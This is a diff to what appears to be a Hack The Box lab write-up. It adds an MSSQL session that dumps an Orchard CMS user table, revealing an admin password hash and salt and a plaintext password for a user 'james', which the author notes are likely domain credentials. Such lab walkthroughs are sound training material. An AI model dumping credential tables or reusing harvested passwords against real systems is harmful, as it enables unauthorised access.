@@ -424,5 +424,17 @@ LastLogoutUtc
 This is the contents of the table
 
 ```python
-
+SQL (admin  admin@orcharddb)> SELECT * FROM blog_Orchard_Users_UserPartRecord
+Id   UserName   Email             NormalizedUserName   Password                                                               PasswordFormat   HashAlgorithm   PasswordSalt               RegistrationStatus   EmailStatus   EmailChallengeToken   CreatedUtc            LastLoginUtc          LastLogoutUtc         
+--   --------   ---------------   ------------------   --------------------------------------------------------------------   --------------   -------------   ------------------------   ------------------   -----------   -------------------   -------------------   -------------------   -------------------   
+ 2   admin                        admin                AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==   Hashed           PBKDF2          UBwWF1CQCsaGc/P7jIR/kg==   Approved             Approved      NULL                  2017-09-01 13:44:01   2026-04-10 17:08:14   2017-09-01 14:06:31   
+15   James      james@htb.local   james                J@m3s_P@ssW0rd!                                                        Plaintext        Plaintext       NA                         Approved             Approved      NULL                  2017-09-01 13:45:44   NULL                  NULL                  
+SQL (admin  admin@orcharddb)> 
 ```
+Looks like there is credentials for a user `james`
+
+```python
+james:J@m3s_P@ssW0rd!
+```
+These look to be domain credentials as well
+
